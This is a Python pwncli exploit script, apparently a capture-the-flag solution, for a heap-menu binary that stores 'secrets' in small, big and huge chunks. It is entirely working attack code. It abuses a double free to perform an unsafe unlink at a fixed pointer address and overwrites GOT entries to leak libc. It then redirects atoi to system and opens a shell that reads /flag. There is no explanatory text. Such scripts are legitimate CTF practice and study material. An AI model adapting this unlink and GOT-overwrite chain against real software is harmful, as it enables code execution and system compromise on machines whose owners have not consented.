#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

small, big, huge = 1, 2, 3

def add(stype, data="deadbeef"):
    io.sendlineafter("3. Renew secret\n", "1")
    io.sendlineafter("3. Huge secret\n", str(stype))
    io.sendafter("Tell me your secret: \n", data)

def dele(stype):
    io.sendlineafter("3. Renew secret\n", "2")
    io.sendlineafter("3. Huge secret\n", str(stype))


def edit(stype, data="deadbeef"):
    io.sendlineafter("3. Renew secret\n", "3")
    io.sendlineafter("3. Huge secret\n", str(stype))
    io.sendafter("Tell me your secret: \n", data)

"""
unlink
"""

small_ptr_addr = 0x6020B0

add(small)
add(big)
dele(small)

# get small bin chunk
add(huge)

# overlap
dele(small)

# prepare for unlink
add(small, flat(0, 0x21, small_ptr_addr - 0x18, small_ptr_addr - 0x10, 0x20))

dele(big)

# edit
edit(small, flat(0, elf.got.free, elf.got.atoi, elf.got.atoi, (1 << 32) + 1))

edit(big, flat(elf.plt.puts))

dele(huge)

libc_base = recv_libc_addr(io, offset=libc.sym.atoi)
log_libc_base_addr(libc_base)

edit(small, flat(libc_base + libc.sym.system))

io.sendline("sh;")

io.sendline("cat /flag")


io.interactive()
